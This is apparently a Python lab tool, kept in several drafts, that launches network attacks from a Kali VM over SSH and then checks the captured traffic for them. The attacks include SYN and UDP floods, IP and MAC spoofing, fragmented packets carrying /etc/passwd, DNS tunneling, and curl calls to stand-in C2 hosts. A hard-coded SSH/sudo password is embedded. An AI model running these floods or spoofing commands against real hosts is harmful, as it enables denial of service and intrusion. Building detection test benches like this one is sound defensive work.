#         f"sudo tc qdisc del dev eth0 root"
#     )
# else:
#     print("❌ Opção inválida.")
#     exit()
#
# print(f"🚀 Executando ataque:\n{comando}\n")
# stdin, stdout, stderr = ssh.exec_command(comando)
# print(stdout.read().decode())
# print(stderr.read().decode())
# ssh.close()
#
# print("⌛ Aguardando término do ataque...")
# time.sleep(12)
#
# print("🛑 Encerrando captura...\n")
# tshark_proc.terminate()
# time.sleep(2)
#
# print("📂 Analisando pacotes capturados...\n")
# try:
#     pkts = rdpcap(nome_arquivo)
# except Exception as e:
#     print(f"❌ Erro ao abrir arquivo pcap: {e}")
#     exit()
#
# if opcao == "8":
#     retransmissoes = 0
#     for pkt in pkts:
#         if pkt.haslayer(TCP) and pkt[TCP].flags == "A":
#             retransmissoes += 1
#     if retransmissoes > 10:
#         print(f"⚠️ Detectadas {retransmissoes} retransmissões TCP (possível anomalia de rede).")
#     else:
#         print("✅ Nenhuma retransmissão anormal detectada.")


# aqui 9 não funcionando

# import subprocess
# import time
# import paramiko
# import ipaddress
# from scapy.all import rdpcap, IP, TCP, UDP, DNS, DNSQR
# import os
#
# def ip_privado(ip_str):
#     ip_obj = ipaddress.ip_address(ip_str)
#     redes_privadas = [
#         ipaddress.ip_network("10.0.0.0/8"),
#         ipaddress.ip_network("172.16.0.0/12"),
#         ipaddress.ip_network("192.168.0.0/16"),
#     ]
#     return any(ip_obj in rede for rede in redes_privadas)
#
# print("🔐 Simulador de Ataques de Rede (Terminal)\n")
# print("1️⃣ IP Spoofing")
# print("2️⃣ TCP SYN Flood")
# print("3️⃣ UDP Flood")
# print("4️⃣ MAC Spoofing - com problema")
# print("5️⃣ Fragmentação Suspeita (evasão de IDS)")
# print("6️⃣ TTL Alterado (Ocultação de Tráfego)")
# print("7️⃣ TCP SYN Scan (Escaneamento de Portas)")
# print("8️⃣ Retransmissões Excessivas")
# print("9️⃣ DNS Tunneling (Nomes longos/estranhos) - com problema")
#
# opcao = input("\nSelecione o tipo de ataque (1-9): ").strip()
#
# ip_kali = input("🖥️ IP da máquina Kali: ").strip()
# ip_vitima = input("🎯 IP da máquina vítima: ").strip()
#
# if opcao == "1":
#     ip_spoofado = input("🎭 IP spoofado (falso): ").strip()
# elif opcao == "4":
#     mac_fake = input("🧬 MAC a ser falsificado (ex: 00:0c:29:fb:6a:d6): ").strip()
#
# interface_id = "4"
# print(f"\n🎯 Interface de captura detectada: {interface_id} (VMnet8)")
#
# nome_arquivo = "captura_ataque.pcap"
# print("\n🎥 Iniciando captura com Tshark...\n")
# tshark_proc = subprocess.Popen([
#     r"C:\\Program Files\\Wireshark\\tshark.exe", "-i", interface_id,
#     "-w", nome_arquivo, "-F", "pcap"
# ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
#
# time.sleep(2)
#
# print("🔐 Conectando na VM Kali...\n")
# ssh = paramiko.SSHClient()
# ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
# ssh.connect(hostname=ip_kali, username="alessandro", password="npfnm1msv")
#
# if opcao == "1":
#     comando = f"echo 'npfnm1msv' | sudo -S hping3 -a {ip_spoofado} -S {ip_vitima} -p 80 -c 10"
# elif opcao == "2":
#     comando = f"echo 'npfnm1msv' | sudo -S timeout 10s hping3 {ip_vitima} -S -p 80 --flood"
# elif opcao == "3":
#     comando = f"echo 'npfnm1msv' | sudo -S timeout 10s nping --udp -p 80 --rate 3000 {ip_vitima}"
# elif opcao == "4":
#     comando = (
#         f"echo 'npfnm1msv' | sudo -S ip link set eth0 down && "
#         f"sudo ip link set eth0 address {mac_fake} && "
#         f"sudo ip link set eth0 up && "
#         f"ping -c 5 {ip_vitima} && "
#         f"sudo ip link set eth0 down && "
#         f"sudo ip link set eth0 address 00:0c:29:f7:61:06 && "
#         f"sudo ip link set eth0 up"
#     )
# elif opcao == "5":
#     comando = f"echo 'npfnm1msv' | sudo -S hping3 -c 50 -d 120 -E /etc/passwd -p 80 -f {ip_vitima}"
# elif opcao == "6":
#     comando = f"echo 'npfnm1msv' | sudo -S hping3 -c 50 -t 1 -S -p 80 {ip_vitima}"
# elif opcao == "9":
#     comando = (
#         f"for i in {{1..10}}; do dig TXT $(openssl rand -hex 15).malicio.so @{ip_vitima}; done"
#     )
# else:
#     print("❌ Opção inválida.")
#     exit()
#
# print(f"🚀 Executando ataque:\n{comando}\n")
# stdin, stdout, stderr = ssh.exec_command(comando)
# print(stdout.read().decode())
# print(stderr.read().decode())
# ssh.close()
#
# print("⌛ Aguardando término do ataque...")
# time.sleep(12)
#
# print("🛑 Encerrando captura...\n")
# tshark_proc.terminate()
# time.sleep(2)
#
# print("📂 Analisando pacotes capturados...\n")
# try:
#     pkts = rdpcap(nome_arquivo)
# except Exception as e:
#     print(f"❌ Erro ao abrir arquivo pcap: {e}")
#     exit()
#
# if opcao == "9":
#     dns_tun_detectado = False
#     dominios_suspeitos = []
#     for pkt in pkts:
#         if pkt.haslayer(DNS) and pkt.haslayer(DNSQR):
#             qname = pkt[DNSQR].qname.decode(errors='ignore')
#             if len(qname) > 50 or any(len(label) > 30 for label in qname.split(".")):
#                 dominios_suspeitos.append(qname)
#     if dominios_suspeitos:
#         print("⚠️ Atividade suspeita de DNS Tunneling:")
#         for d in dominios_suspeitos:
#             print(f"🔍 Nome suspeito: {d}")
#     else:
#         print("✅ Nenhuma atividade de DNS Tunneling detectada.")



# opção 10 funcionando

# import subprocess
# import time
# import paramiko
# import ipaddress
# from scapy.all import rdpcap, IP, TCP, UDP, Raw, DNS, DNSQR
# import os
#
#
# def ip_privado(ip_str):
#     ip_obj = ipaddress.ip_address(ip_str)
#     redes_privadas = [
#         ipaddress.ip_network("10.0.0.0/8"),
#         ipaddress.ip_network("172.16.0.0/12"),
#         ipaddress.ip_network("192.168.0.0/16"),
#     ]
#     return any(ip_obj in rede for rede in redes_privadas)
#
#
# # Menu
# print("🔐 Simulador de Ataques de Rede (Terminal)\n")
# print("1️⃣ IP Spoofing")
# print("2️⃣ TCP SYN Flood")
# print("3️⃣ UDP Flood")
# print("4️⃣ MAC Spoofing - com problema")
# print("5️⃣ Fragmentação Suspeita (evasão de IDS)")
# print("6️⃣ TTL Alterado (Ocultação de Tráfego)")
# print("7️⃣ TCP SYN Scan (Escaneamento de Portas)")
# print("8️⃣ Retransmissões Excessivas")
# print("9️⃣ DNS Tunneling (Nomes longos/estranhos) - com problema")
# print("🔟 Domínios Suspeitos (Maliciosos)")
#
# opcao = input("\nSelecione o tipo de ataque (1-10): ").strip()
#
# ip_kali = input("🖥️ IP da máquina Kali: ").strip()
# ip_vitima = input("🎯 IP da máquina vítima: ").strip()
#
# if opcao == "1":
#     ip_spoofado = input("🎭 IP spoofado (falso): ").strip()
# elif opcao == "4":
#     mac_fake = input("🧬 MAC a ser falsificado (ex: 00:0c:29:fb:6a:d6): ").strip()
#
# interface_id = "4"
# print(f"\n🎯 Interface de captura detectada: {interface_id} (VMnet8)")
#
# nome_arquivo = "captura_ataque.pcap"
# print("\n🎥 Iniciando captura com Tshark...\n")
# tshark_proc = subprocess.Popen([
#     r"C:\Program Files\Wireshark\tshark.exe", "-i", interface_id,
#     "-w", nome_arquivo, "-F", "pcap"
# ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
#
# time.sleep(2)
#
# print("🔐 Conectando na VM Kali...\n")
# ssh = paramiko.SSHClient()
# ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
# ssh.connect(hostname=ip_kali, username="alessandro", password="npfnm1msv")
#
# if opcao == "1":
#     comando = f"echo 'npfnm1msv' | sudo -S hping3 -a {ip_spoofado} -S {ip_vitima} -p 80 -c 10"
# elif opcao == "2":
#     comando = f"echo 'npfnm1msv' | sudo -S timeout 10s hping3 {ip_vitima} -S -p 80 --flood"
# elif opcao == "3":
#     comando = f"echo 'npfnm1msv' | sudo -S timeout 10s nping --udp -p 80 --rate 3000 {ip_vitima}"
# elif opcao == "4":
#     comando = (
#         f"echo 'npfnm1msv' | sudo -S ip link set eth0 down && "
#         f"sudo ip link set eth0 address {mac_fake} && "
#         f"sudo ip link set eth0 up && "
#         f"ping -c 5 {ip_vitima} && "
#         f"sudo ip link set eth0 down && "
#         f"sudo ip link set eth0 address 00:0c:29:f7:61:06 && "
#         f"sudo ip link set eth0 up"
#     )
# elif opcao == "5":
#     comando = f"echo 'npfnm1msv' | sudo -S hping3 -c 50 -d 120 -E /etc/passwd -p 80 -f {ip_vitima}"
# elif opcao == "6":
#     comando = f"echo 'npfnm1msv' | sudo -S hping3 -c 50 -t 1 -S -p 80 {ip_vitima}"
# elif opcao == "7":
#     comando = f"echo 'npfnm1msv' | sudo -S nmap -sS -p 1-1000 {ip_vitima}"
# elif opcao == "8":
#     comando = f"echo 'npfnm1msv' | sudo -S tc qdisc add dev eth0 root netem loss 50% && curl -I http://{ip_vitima} && sudo tc qdisc del dev eth0 root"
# elif opcao == "9":
#     comando = f"for i in {{1..10}}; do dig TXT $(openssl rand -hex 15).malicio.so @{ip_vitima}; done"
# elif opcao == "10":
#     comando = f"dig any comandos.controle.tk && curl http://c2.fake.ru"
# else:
#     print("❌ Opção inválida.")
#     exit()
#
# print(f"🚀 Executando ataque:\n{comando}\n")
# stdin, stdout, stderr = ssh.exec_command(comando)
# print(stdout.read().decode())
# print(stderr.read().decode())
# ssh.close()
#
# print("⌛ Aguardando término do ataque...")
# time.sleep(12)
#
# print("🛑 Encerrando captura...\n")
# tshark_proc.terminate()
# time.sleep(2)
#
# print("📂 Analisando pacotes capturados...\n")
# try:
#     pkts = rdpcap(nome_arquivo)
# except Exception as e:
#     print(f"❌ Erro ao abrir arquivo pcap: {e}")
#     exit()
#
# # DNS Tunneling ou Domínios Suspeitos
# if opcao in ["9", "10"]:
#     dns_detectado = False
#     for pkt in pkts:
#         if pkt.haslayer(DNS) and pkt.haslayer(DNSQR):
#             qname = pkt[DNSQR].qname.decode(errors="ignore")
#             if ".malicio.so" in qname or ".controle.tk" in qname or ".fake.ru" in qname:
#                 print(f"⚠️ DNS suspeito detectado: {qname}")
#                 dns_detectado = True
#     if not dns_detectado:
#         print("✅ Nenhuma atividade de DNS suspeito detectada.")



# opção 11 funcionando

# import subprocess
# import time
# import paramiko
# import ipaddress
# from scapy.all import rdpcap, IP, TCP, UDP, Raw
# import os
#
# def ip_privado(ip_str):
#     ip_obj = ipaddress.ip_address(ip_str)
#     redes_privadas = [
#         ipaddress.ip_network("10.0.0.0/8"),
#         ipaddress.ip_network("172.16.0.0/12"),
#         ipaddress.ip_network("192.168.0.0/16"),
#     ]
#     return any(ip_obj in rede for rede in redes_privadas)
#
# print("🔐 Simulador de Ataques de Rede (Terminal)\n")
# print("1️⃣ IP Spoofing")
# print("2️⃣ TCP SYN Flood")
# print("3️⃣ UDP Flood")
# print("4️⃣ MAC Spoofing - com problema")
# print("5️⃣ Fragmentação Suspeita (evasão de IDS)")
# print("6️⃣ TTL Alterado (Ocultação de Tráfego)")
# print("7️⃣ TCP SYN Scan (Escaneamento de Portas)")
# print("8️⃣ Retransmissões Excessivas")
# print("9️⃣ DNS Tunneling (Nomes longos/estranhos - com problema)")
# print("🔟 Domínios Suspeitos (Maliciosos)")
# print("1️⃣1️⃣ User-Agent Anormal (Falsificado)")
#
# opcao = input("\nSelecione o tipo de ataque (1-11): ").strip()
# ip_kali = input("🖥️ IP da máquina Kali: ").strip()
# ip_vitima = input("🎯 IP da máquina vítima: ").strip()
#
# if opcao == "1":
#     ip_spoofado = input("🎭 IP spoofado (falso): ").strip()
# elif opcao == "4":
#     mac_fake = input("🧬 MAC a ser falsificado (ex: 00:0c:29:fb:6a:d6): ").strip()
#
# interface_id = "4"
# print(f"\n🎯 Interface de captura detectada: {interface_id} (VMnet8)")
#
# nome_arquivo = "captura_ataque.pcap"
# print("\n🎥 Iniciando captura com Tshark...\n")
# tshark_proc = subprocess.Popen([
#     r"C:\Program Files\Wireshark\tshark.exe", "-i", interface_id,
#     "-w", nome_arquivo, "-F", "pcap"
# ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
#
# time.sleep(2)
#
# print("🔐 Conectando na VM Kali...\n")
# ssh = paramiko.SSHClient()
# ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
# ssh.connect(hostname=ip_kali, username="alessandro", password="npfnm1msv")
#
# if opcao == "1":
#     comando = f"echo 'npfnm1msv' | sudo -S hping3 -a {ip_spoofado} -S {ip_vitima} -p 80 -c 10"
# elif opcao == "2":
#     comando = f"echo 'npfnm1msv' | sudo -S timeout 10s hping3 {ip_vitima} -S -p 80 --flood"
# elif opcao == "3":
#     comando = f"echo 'npfnm1msv' | sudo -S timeout 10s nping --udp -p 80 --rate 3000 {ip_vitima}"
# elif opcao == "4":
#     comando = (
#         f"echo 'npfnm1msv' | sudo -S ip link set eth0 down && "
#         f"sudo ip link set eth0 address {mac_fake} && "
#         f"sudo ip link set eth0 up && "
#         f"ping -c 5 {ip_vitima} && "
#         f"sudo ip link set eth0 down && "
#         f"sudo ip link set eth0 address 00:0c:29:f7:61:06 && "
#         f"sudo ip link set eth0 up"
#     )
# elif opcao == "5":
#     comando = f"echo 'npfnm1msv' | sudo -S hping3 -c 50 -d 120 -E /etc/passwd -p 80 -f {ip_vitima}"
# elif opcao == "6":
#     comando = f"echo 'npfnm1msv' | sudo -S hping3 -c 50 -t 1 -S -p 80 {ip_vitima}"
# elif opcao == "7":
#     comando = f"echo 'npfnm1msv' | sudo -S nmap -sS -p 1-1000 {ip_vitima}"
# elif opcao == "8":
#     comando = (
#         f"echo 'npfnm1msv' | sudo -S tc qdisc add dev eth0 root netem loss 50% && "
#         f"curl -I http://{ip_vitima} && "
#         f"sudo tc qdisc del dev eth0 root"
#     )
# elif opcao == "9":
#     comando = (
#         f"for i in {{1..10}}; do dig TXT $(openssl rand -hex 15).malicio.so @{ip_vitima}; done"
#     )
# elif opcao == "10":
#     comando = (
#         f"dig any comandos.controle.tk && curl http://c2.fake.ru"
#     )
# elif opcao == "11":
#     comando = (
#         f"curl -A \"FakeScannerBot/9.9 (linux; rootkit)\" http://{ip_vitima}"
#     )
# else:
#     print("❌ Opção inválida.")
#     exit()
#
# print(f"🚀 Executando ataque:\n{comando}\n")
# stdin, stdout, stderr = ssh.exec_command(comando)
# print(stdout.read().decode())
# print(stderr.read().decode())
# ssh.close()
#
# print("⌛ Aguardando término do ataque...")
# time.sleep(12)
#
# print("🛑 Encerrando captura...\n")
# tshark_proc.terminate()
# time.sleep(2)
#
# print("📂 Analisando pacotes capturados...\n")
# try:
#     pkts = rdpcap(nome_arquivo)
# except Exception as e:
#     print(f"❌ Erro ao abrir arquivo pcap: {e}")
#     exit()
#
# # Análises específicas por ataque
# if opcao == "1":
#     ips_confiaveis = {ip_spoofado, "192.168.1.6", "192.168.1.3", "192.168.1.13"}
#     suspeitos = []
#     for pkt in pkts:
#         if IP in pkt:
#             src = pkt[IP].src
#             if ip_privado(src) and src not in ips_confiaveis:
#                 suspeitos.append(f"⚠️ Spoofing suspeito: {src} → {pkt[IP].dst}")
#     if suspeitos:
#         print("🔍 IPs suspeitos detectados:\n")
#         for alerta in suspeitos:
#             print(alerta)
#     else:
#         print("✅ Nenhum spoofing detectado.")
#
# elif opcao == "2":
#     syn_count = {}
#     ack_count = {}
#     for pkt in pkts:
#         if pkt.haslayer(IP) and pkt.haslayer(TCP):
#             ip_src = pkt[IP].src
#             flags = pkt[TCP].flags
#             if flags == "S":
#                 syn_count[ip_src] = syn_count.get(ip_src, 0) + 1
#             elif 'A' in flags and 'S' not in flags:
#                 ack_count[ip_src] = ack_count.get(ip_src, 0) + 1
#     for ip in syn_count:
#         syns = syn_count[ip]
#         acks = ack_count.get(ip, 0)
#         ratio = acks / syns if syns > 0 else 0
#         if syns > 100 and ratio < 0.1:
#             print(f"⚠️ SYN Flood detectado de {ip} ({syns} SYNs, {acks} ACKs, ratio={ratio:.2f})")
#             break
#     else:
#         print("✅ Nenhum SYN Flood detectado.")
#
# elif opcao == "3":
#     udp_count = {}
#     for pkt in pkts:
#         if pkt.haslayer(IP) and pkt.haslayer(UDP):
#             src = pkt[IP].src
#             udp_count[src] = udp_count.get(src, 0) + 1
#     for ip, count in udp_count.items():
#         if count > 500:
#             print(f"⚠️ UDP Flood detectado do IP {ip} ({count} pacotes UDP).")
#             break
#     else:
#         print("✅ Nenhum UDP Flood detectado.")
#
# elif opcao == "4":
#     print("🔍 MAC Spoofing executado. Verifique os efeitos manualmente (análise de ARP ou logs de rede).")
#
# elif opcao == "5":
#     frag_detectado = False
#     for pkt in pkts:
#         if IP in pkt:
#             frag_offset = pkt[IP].frag
#             mf_flag = pkt[IP].flags.MF if hasattr(pkt[IP].flags, "MF") else pkt[IP].flags & 0x1
#             if frag_offset > 0 or mf_flag:
#                 print(f"⚠️ Fragmento detectado de {pkt[IP].src} → {pkt[IP].dst}")
#                 frag_detectado = True
#     if not frag_detectado:
#         print("✅ Nenhum pacote fragmentado detectado.")
#
# elif opcao == "6":
#     ttl_suspeito = False
#     for pkt in pkts:
#         if IP in pkt and pkt[IP].ttl <= 5:
#             print(f"⚠️ TTL suspeito: {pkt[IP].src} → {pkt[IP].dst} (TTL={pkt[IP].ttl})")
#             ttl_suspeito = True
#     if not ttl_suspeito:
#         print("✅ Nenhuma anomalia de TTL detectada.")
#
# elif opcao == "8":
#     retransmissoes = 0
#     for pkt in pkts:
#         if TCP in pkt and pkt[TCP].flags == 'PA':
#             if Raw in pkt and b'HTTP' in bytes(pkt[Raw]):
#                 continue
#         if pkt.haslayer(TCP) and pkt[TCP].seq == pkt[TCP].ack:
#             retransmissoes += 1
#     if retransmissoes > 20:
#         print(f"⚠️ Detectadas {retransmissoes} retransmissões TCP (possível anomalia de rede).")
#     else:
#         print("✅ Nenhuma retransmissão excessiva detectada.")
#
# elif opcao == "9":
#     suspeitos = []
#     for pkt in pkts:
#         if pkt.haslayer(UDP) and pkt.haslayer(Raw):
#             payload = pkt[Raw].load.decode(errors="ignore")
#             if ".malicio.so" in payload:
#                 suspeitos.append(payload)
#     if suspeitos:
#         print("⚠️ DNS Tunneling detectado em pacotes:")
#         for s in suspeitos:
#             print(f"  ↳ {s}")
#     else:
#         print("✅ Nenhuma atividade de DNS Tunneling detectada.")
#
# elif opcao == "10":
#     dominios = ["comandos.controle.tk", "c2.fake.ru"]
#     for pkt in pkts:
#         if pkt.haslayer(Raw):
#             raw_data = pkt[Raw].load.decode(errors="ignore")
#             for dominio in dominios:
#                 if dominio in raw_data:
#                     print(f"⚠️ DNS suspeito detectado: {dominio}.")
#                     break
#     else:
#         print("✅ Nenhuma atividade suspeita de domínio detectada.")
#
# elif opcao == "11":
#     user_agents_suspeitos = ["FakeScannerBot", "EvilBotnetScanner"]
#     detectado = False
#     for pkt in pkts:
#         if pkt.haslayer(Raw):
#             http_payload = pkt[Raw].load.decode(errors="ignore")
#             if "User-Agent" in http_payload:
#                 for ua in user_agents_suspeitos:
#                     if ua in http_payload:
#                         print(f"⚠️ User-Agent suspeito detectado: {ua}")
#                         detectado = True
#     if not detectado:
#         print("✅ Nenhum User-Agent suspeito detectado.")


# exceto para itens 4 e 9, tudo funcionando
# proximo passo, fazer funcionar 4 e 9 ou retirá-los da lista
# depois pedir melhorias e ver potencial de mercado

import subprocess
import time
import paramiko
import ipaddress
from scapy.all import rdpcap, IP, TCP, UDP, Raw
import os

def ip_privado(ip_str):
    ip_obj = ipaddress.ip_address(ip_str)
    redes_privadas = [
        ipaddress.ip_network("10.0.0.0/8"),
        ipaddress.ip_network("172.16.0.0/12"),
        ipaddress.ip_network("192.168.0.0/16"),
    ]
    return any(ip_obj in rede for rede in redes_privadas)

print("🔐 Simulador de Ataques de Rede (Terminal)\n")
print("1️⃣ IP Spoofing")
print("2️⃣ TCP SYN Flood")
print("3️⃣ UDP Flood")
print("4️⃣ MAC Spoofing - com problema")
print("5️⃣ Fragmentação Suspeita (evasão de IDS)")
print("6️⃣ TTL Alterado (Ocultação de Tráfego)")
print("7️⃣ TCP SYN Scan (Escaneamento de Portas)")
print("8️⃣ Retransmissões Excessivas")
print("9️⃣ DNS Tunneling (Nomes longos/estranhos - com problema)")
print("🔟 Domínios Suspeitos (Maliciosos)")
print("1️⃣1️⃣ User-Agent Anormal (Falsificado)")
print("1️⃣2️⃣ TLS Handshake Incompleto")

opcao = input("\nSelecione o tipo de ataque (1-12): ").strip()
ip_kali = input("🖥️ IP da máquina Kali: ").strip()
ip_vitima = input("🎯 IP da máquina vítima: ").strip()

if opcao == "1":
    ip_spoofado = input("🎭 IP spoofado (falso): ").strip()
elif opcao == "4":
    mac_fake = input("🧬 MAC a ser falsificado (ex: 00:0c:29:fb:6a:d6): ").strip()

interface_id = "4"
print(f"\n🎯 Interface de captura detectada: {interface_id} (VMnet8)")

nome_arquivo = "captura_ataque.pcap"
print("\n🎥 Iniciando captura com Tshark...\n")
tshark_proc = subprocess.Popen([
    r"C:\Program Files\Wireshark\tshark.exe", "-i", interface_id,
    "-w", nome_arquivo, "-F", "pcap"
], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

time.sleep(2)

print("🔐 Conectando na VM Kali...\n")
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect(hostname=ip_kali, username="alessandro", password="npfnm1msv")

# Comandos de ataque
if opcao == "1":
    comando = f"echo 'npfnm1msv' | sudo -S hping3 -a {ip_spoofado} -S {ip_vitima} -p 80 -c 10"
elif opcao == "2":
    comando = f"echo 'npfnm1msv' | sudo -S timeout 10s hping3 {ip_vitima} -S -p 80 --flood"
elif opcao == "3":
    comando = f"echo 'npfnm1msv' | sudo -S timeout 10s nping --udp -p 80 --rate 3000 {ip_vitima}"
elif opcao == "4":
    comando = (
        f"echo 'npfnm1msv' | sudo -S ip link set eth0 down && "
        f"sudo ip link set eth0 address {mac_fake} && "
        f"sudo ip link set eth0 up && "
        f"ping -c 5 {ip_vitima} && "
        f"sudo ip link set eth0 down && "
        f"sudo ip link set eth0 address 00:0c:29:f7:61:06 && "
        f"sudo ip link set eth0 up"
    )
elif opcao == "5":
    comando = f"echo 'npfnm1msv' | sudo -S hping3 -c 50 -d 120 -E /etc/passwd -p 80 -f {ip_vitima}"
elif opcao == "6":
    comando = f"echo 'npfnm1msv' | sudo -S hping3 -c 50 -t 1 -S -p 80 {ip_vitima}"
elif opcao == "7":
    comando = f"echo 'npfnm1msv' | sudo -S nmap -sS -p 1-1000 {ip_vitima}"
elif opcao == "8":
    comando = f"echo 'npfnm1msv' | sudo -S tc qdisc add dev eth0 root netem loss 50% && curl -I http://{ip_vitima} && sudo tc qdisc del dev eth0 root"
elif opcao == "9":
    comando = f"for i in {{1..10}}; do dig TXT $(openssl rand -hex 15).malicio.so @{ip_vitima}; done"
elif opcao == "10":
    comando = f"dig any comandos.controle.tk && curl http://c2.fake.ru"
elif opcao == "11":
    comando = f"curl -A \"FakeScannerBot/9.9 (linux; rootkit)\" http://{ip_vitima}"
elif opcao == "12":
    comando = f"timeout 1 openssl s_client -connect {ip_vitima}:443"
else:
    print("❌ Opção inválida.")
    exit()

print(f"🚀 Executando ataque:\n{comando}\n")
stdin, stdout, stderr = ssh.exec_command(comando)
print(stdout.read().decode())
print(stderr.read().decode())
ssh.close()

print("⌛ Aguardando término do ataque...")
time.sleep(12)

print("🛑 Encerrando captura...\n")
tshark_proc.terminate()
time.sleep(2)

print("📂 Analisando pacotes capturados...\n")
try:
    pkts = rdpcap(nome_arquivo)
except Exception as e:
    print(f"❌ Erro ao abrir arquivo pcap: {e}")
    exit()

# TLS Handshake Incompleto - Nova lógica
if opcao == "12":
    client_hello_detectado = 0
    server_hello_detectado = 0

    for pkt in pkts:
        if pkt.haslayer(TCP) and pkt.haslayer(Raw):
            raw_bytes = bytes(pkt[Raw])
            if raw_bytes.startswith(b'\x16\x03'):
                if raw_bytes[5] == 0x01:
                    client_hello_detectado += 1
                elif raw_bytes[5] == 0x02:
                    server_hello_detectado += 1

    if client_hello_detectado > 0 and server_hello_detectado == 0:
        print(f"⚠️ TLS Handshake incompleto detectado ({client_hello_detectado} Client Hello sem Server Hello).")
    else:
        print("✅ Nenhuma anomalia de TLS handshake detectada.")


